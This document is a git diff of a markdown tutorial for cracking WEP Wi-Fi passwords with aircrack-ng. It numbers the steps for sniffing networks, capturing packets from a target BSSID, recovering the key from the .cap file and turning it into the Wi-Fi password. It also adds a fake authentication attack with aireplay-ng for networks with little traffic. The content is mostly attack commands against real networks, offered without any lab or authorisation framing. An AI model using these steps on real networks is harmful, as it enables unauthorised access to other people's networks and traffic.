@@ -30,22 +30,33 @@ ifconfig wlan0 up
 
 >The mode will be Monitor now
 
-- Sniffing on 5G and 2.4G networks and find the network with the cipher WEP
+1. Sniffing on 5G and 2.4G networks and find the network with the cipher WEP
 ```bash
 airdump-ng --band abg wlan0
 ```
 
-- Sniffing packets from the network with the WEP cipher with the specific MAC and channel number and save the results in a file test
+2. Sniffing packets from the network with the WEP cipher with the specific MAC and channel number and save the results in a file test
 ```bash
 airodump-ng --bssid 03:DE:4B:AD:CC:8B --channel 9 --write test mon0
 ```
 
-- Wait for the #Data number to move real fast and open a new terminal window and ls to find the ".cap" file that you created.
-- Use aircrack-ng to find the Key from the file we created ending with .cap
+3. Wait for the #Data number to move real fast and open a new terminal window and ls to find the ".cap" file that you created.
+4. Use aircrack-ng to find the Key from the file we created ending with .cap
 ```bash
 aircrack-ng test.cap
 ```
-- Copy the key and remove the : and that would be the wifi password.
+5. Copy the key and remove the : and that would be the wifi password.
+
+> If the network is not busy we need to follow the steps below: -
+1. We need to capture data from the WEP network and write it in a file.
+```bash
+ airodump-ng --bssid B4:75:0E:36:6A:9E --channel 11 --write basic_wep wlan0
+```
+2. We will need to commmunicate with the WEP network by creating a Fake Authentication attack using aireplay-ng
+```bash
+aireplay-ng --fakeauth 0 B4:75:0E:36:6A:9E -h 6E:3D:AC:84:DB:A0 wlan0
+```
+>the first MAC is the target and the second MAC is the USB adapter.
 
 ### Steps for WPA/WPA2
 
